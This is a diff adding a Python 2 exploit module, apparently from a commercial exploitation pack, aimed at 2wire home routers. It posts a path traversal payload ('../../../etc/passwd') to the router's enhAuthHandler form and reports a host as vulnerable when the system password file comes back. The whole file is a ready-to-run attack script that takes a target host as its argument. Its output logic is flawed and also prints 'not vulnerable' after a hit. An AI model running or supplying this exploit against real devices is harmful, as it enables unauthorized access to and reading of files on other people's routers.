@@ -1,0 +1,45 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_2wire_1'
+_vendor_ = '2wire'
+_model_  = ['4011G','5012NV']
+_vuln_   = 'Path Traversal Vulnerability'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    url = "http://%s/goform/enhAuthHandler" % host
+    headers = {u"Content-Type": u"application/x-www-form-urlencoded"}
+    data = {"__ENH_SHOW_REDIRECT_PATH__": "/pages/C_4_0.asp/../../../etc/passwd",
+      "__ENH_SUBMIT_VALUE_SHOW__": "Acceder",
+      "__ENH_SUBMIT_VALUE_SHOW__": "",
+      "username": "d2d2"}
+    response = requests.post(url, headers=headers, data=data)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if "root:" in response.text:
+    print '[+] %s vulnerable' % host
+    print response
+  print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
